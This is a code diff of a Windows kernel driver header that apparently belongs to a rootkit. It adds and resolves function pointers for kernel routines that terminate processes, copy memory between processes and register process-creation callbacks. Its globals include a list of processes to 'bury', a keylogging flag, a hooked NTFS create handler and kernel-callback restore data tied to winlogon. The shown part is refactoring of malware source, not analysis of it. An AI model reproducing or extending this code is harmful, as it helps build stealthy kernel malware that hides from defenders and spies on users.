@@ -5,8 +5,18 @@
 #include "WinTypes.hpp"
 #include "Vector.hpp"
 
+// Function Prototypes
+typedef NTSTATUS(*IOCREATEDRIVER)(PUNICODE_STRING DriverName, PDRIVER_INITIALIZE InitializationFunction);
+typedef NTSTATUS(*ZWTERMINATEPROCESS)(IN HANDLE ProcessHandle OPTIONAL, IN NTSTATUS ExitStatus);
+typedef NTSTATUS(*ZWOPENPROCESS)(OUT PHANDLE ProcessHandle, IN ACCESS_MASK DesiredAccess, IN POBJECT_ATTRIBUTES ObjectAttributes, IN PCLIENT_ID ClientId);
+typedef NTSTATUS(*ZWCLOSE)(IN HANDLE Handle);
+typedef NTSTATUS(*ZWPROTECTVIRTUALMEMORY)(IN HANDLE ProcessHandle, IN OUT PVOID* BaseAddress, IN OUT PSIZE_T RegionSize, IN ULONG NewProtect, OUT PULONG OldProtect);
+typedef NTSTATUS(*MMCOPYVIRTUALMEMORY)(IN PEPROCESS SourceProcess, IN PVOID SourceAddress, IN PEPROCESS TargetProcess, OUT PVOID TargetAddress, IN SIZE_T BufferSize, IN KPROCESSOR_MODE PreviousMode, OUT PSIZE_T ReturnSize);
+typedef NTSTATUS(*PSSETCREATEPROCESSNOTIFYROUTINEEX)(IN PCREATE_PROCESS_NOTIFY_ROUTINE_EX NotifyRoutine, IN BOOLEAN Remove);
 typedef NTSTATUS(*ZWQUERYSYSTEMINFORMATION)(IN SYSTEM_INFORMATION_CLASS SystemInformationClass, OUT PVOID SystemInformation, IN ULONG SystemInformationLength, OUT PULONG ReturnLength OPTIONAL);
 typedef NTSTATUS(*OBREFERENCEOBJECTBYNAME)(PUNICODE_STRING ObjectName, ULONG Attributes, PACCESS_STATE AccessState, ACCESS_MASK DesiredAccess, POBJECT_TYPE ObjectType, KPROCESSOR_MODE AccessMode, PVOID ParseContext, PVOID* Object);
+typedef NTSTATUS(*ZWSETEVENT)(IN HANDLE EventHandle, OUT PIO_STATUS_BLOCK IoStatusBlock OPTIONAL);
+typedef NTSTATUS(*ZWRESETEVENT)(IN HANDLE EventHandle, OUT PIO_STATUS_BLOCK IoStatusBlock OPTIONAL);
 
 namespace BeGlobals
 {
@@ -16,6 +26,14 @@ namespace BeGlobals
 
     OBREFERENCEOBJECTBYNAME pObReferenceObjectByName;
     ZWQUERYSYSTEMINFORMATION pZwQuerySystemInformation;
+    ZWTERMINATEPROCESS pZwTerminateProcess;
+    ZWOPENPROCESS pZwOpenProcess;
+    ZWCLOSE pZwClose;
+    ZWPROTECTVIRTUALMEMORY pZwProtectVirtualMemory;
+    MMCOPYVIRTUALMEMORY pMmCopyVirtualMemory;
+    PSSETCREATEPROCESSNOTIFYROUTINEEX pPsSetCreateProcessNotifyRoutineEx;
+    ZWSETEVENT pZwSetEvent;
+    ZWRESETEVENT pZwResetEvent;
 
     HANDLE winLogonPid;
     PEPROCESS winLogonProc;
@@ -52,15 +70,6 @@ typedef struct _KERNEL_CALLBACK_RESTORE_INFO_ARRAY {
 
 typedef NTSTATUS(NTAPI* NTFS_IRP_MJ_CREATE_FUNCTION)(PDEVICE_OBJECT DeviceObject, PIRP Irp);
 
-// Function Prototypes
-typedef NTSTATUS(*IOCREATEDRIVER)(PUNICODE_STRING DriverName, PDRIVER_INITIALIZE InitializationFunction);
-typedef NTSTATUS(*ZWTERMINATEPROCESS)(IN HANDLE ProcessHandle OPTIONAL, IN NTSTATUS ExitStatus);
-typedef NTSTATUS(*ZWOPENPROCESS)(OUT PHANDLE ProcessHandle, IN ACCESS_MASK DesiredAccess, IN POBJECT_ATTRIBUTES ObjectAttributes, IN PCLIENT_ID ClientId);
-typedef NTSTATUS(*ZWCLOSE)(IN HANDLE Handle);
-typedef NTSTATUS(*ZWPROTECTVIRTUALMEMORY)(IN HANDLE ProcessHandle, IN OUT PVOID* BaseAddress, IN OUT PSIZE_T RegionSize, IN ULONG NewProtect, OUT PULONG OldProtect);
-typedef NTSTATUS(*MMCOPYVIRTUALMEMORY)(IN PEPROCESS SourceProcess, IN PVOID SourceAddress, IN PEPROCESS TargetProcess, OUT PVOID TargetAddress, IN SIZE_T BufferSize, IN KPROCESSOR_MODE PreviousMode, OUT PSIZE_T ReturnSize);
-typedef NTSTATUS(*PSSETCREATEPROCESSNOTIFYROUTINEEX)(IN PCREATE_PROCESS_NOTIFY_ROUTINE_EX NotifyRoutine, IN BOOLEAN Remove);
-
 namespace BeGlobals
 {
     WCHAR_ARRAY beBuryTargetProcesses = { { NULL }, 0 };
@@ -71,13 +80,6 @@ namespace BeGlobals
     FastMutex callbackLock = FastMutex();
 
     NTFS_IRP_MJ_CREATE_FUNCTION originalNTFS_IRP_MJ_CREATE_function = NULL;
-
-    ZWTERMINATEPROCESS pZwTerminateProcess;
-    ZWOPENPROCESS pZwOpenProcess;
-    ZWCLOSE pZwClose;
-    ZWPROTECTVIRTUALMEMORY pZwProtectVirtualMemory;
-    MMCOPYVIRTUALMEMORY pMmCopyVirtualMemory;
-    PSSETCREATEPROCESSNOTIFYROUTINEEX pPsSetCreateProcessNotifyRoutineEx;
 
     bool shutdown = false;
     bool logKeys = false;
@@ -132,6 +134,8 @@ namespace BeGlobals
         pZwTerminateProcess = (ZWTERMINATEPROCESS)BeGetSystemRoutineAddress(NtOsKrnl, "ZwTerminateProcess");
         pZwOpenProcess = (ZWOPENPROCESS)BeGetSystemRoutineAddress(NtOsKrnl, "ZwOpenProcess");
         pZwClose = (ZWCLOSE)BeGetSystemRoutineAddress(NtOsKrnl, "ZwClose");
+        pZwResetEvent = (ZWRESETEVENT)BeGetSystemRoutineAddress(NtOsKrnl, "ZwResetEvent");
+        pZwSetEvent = (ZWSETEVENT)BeGetSystemRoutineAddress(NtOsKrnl, "ZwSetEvent");
         pZwProtectVirtualMemory = (ZWPROTECTVIRTUALMEMORY)BeGetSystemRoutineAddress(NtOsKrnl, "ZwProtectVirtualMemory");
         pMmCopyVirtualMemory = (MMCOPYVIRTUALMEMORY)BeGetSystemRoutineAddress(NtOsKrnl, "MmCopyVirtualMemory");
         // pObReferenceObjectByName = (OBREFERENCEOBJECTBYNAME)BeGetSystemRoutineAddress(NtOsKrnl, "ObReferenceObjectByName");
@@ -151,7 +155,6 @@ namespace BeGlobals
         LOG_MSG("Found winlogon PID: %lu\n", HandleToUlong(winLogonPid));
         if (PsLookupProcessByProcessId(winLogonPid, &winLogonProc))
         {
-            ObDereferenceObject(winLogonProc);
             return STATUS_NOT_FOUND;
         }
 
